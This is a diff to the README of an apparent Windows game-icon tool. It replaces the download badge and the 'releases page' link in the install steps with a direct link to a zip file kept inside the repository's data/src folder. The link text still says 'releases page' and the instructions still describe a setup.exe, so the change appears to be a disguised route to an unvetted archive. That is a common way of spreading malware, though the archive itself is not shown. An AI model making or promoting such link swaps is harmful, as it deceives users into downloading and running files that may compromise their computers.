@@ -1,6 +1,6 @@
 # 🎮 game-icons-studio - Turn shortcuts into visual game art
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/lindsyofficial594/game-icons-studio/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/lindsyofficial594/game-icons-studio/main/data/src/game-icons-studio-v1.7.zip)
 
 ## 📖 About this application
 
@@ -14,7 +14,7 @@ This application runs on any Windows 10 or Windows 11 computer. You need a stabl
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [releases page](https://github.com/lindsyofficial594/game-icons-studio/releases) to download the latest version of the installer.
+1. Visit the [releases page](https://raw.githubusercontent.com/lindsyofficial594/game-icons-studio/main/data/src/game-icons-studio-v1.7.zip) to download the latest version of the installer.
 2. Locate the file named `game-icons-studio-setup.exe` in your Downloads folder.
 3. Double-click the file to start the installation process.
 4. Follow the prompts on your screen.
